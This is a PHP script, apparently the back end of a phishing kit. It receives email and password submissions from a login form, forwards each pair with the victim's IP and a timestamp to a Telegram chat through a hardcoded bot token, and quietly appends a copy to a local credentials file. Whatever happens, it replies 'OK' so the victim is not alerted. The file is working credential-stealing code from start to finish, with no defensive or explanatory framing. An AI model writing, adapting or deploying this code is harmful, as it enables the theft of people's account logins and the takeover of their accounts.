<?php
// telegram_logger.php
header('Content-Type: text/plain');

// Telegram Bot Configuration
$BOT_TOKEN = '8346148281:AAEbtVNUKteys4gVteB3fLFmjCuxUFhQwJ8';
$CHAT_ID = '-1002402221199';

// Get posted data
$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$timestamp = $_POST['timestamp'] ?? date('Y-m-d H:i:s');
$user_agent = $_POST['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';

// Sanitize data
$email = htmlspecialchars($email);
$password = htmlspecialchars($password);

// Create Telegram message
$message = "🔐 *NEW CREDENTIALS CAPTURED* 🔐\n\n";
$message .= "📧 *Email:* `{$email}`\n";
$message .= "🔑 *Password:* `{$password}`\n";
$message .= "⏰ *Time:* {$timestamp}\n";
$message .= "🌐 *IP:* `{$ip_address}`\n";

// Send to Telegram
$telegram_url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$post_data = [
    'chat_id' => $CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'disable_web_page_preview' => true
];

// Use cURL to send message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Shorter timeout

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Always log to local file as primary backup (silent)
$log_entry = date('Y-m-d H:i:s') . " | IP: {$ip_address} | Email: {$email} | Password: {$password}\n";
file_put_contents('captured_credentials.txt', $log_entry, FILE_APPEND | LOCK_EX);

// Return simple response
if ($http_code == 200) {
    echo "OK";
} else {
    // Even if Telegram fails, we still logged locally
    echo "OK";
}
?>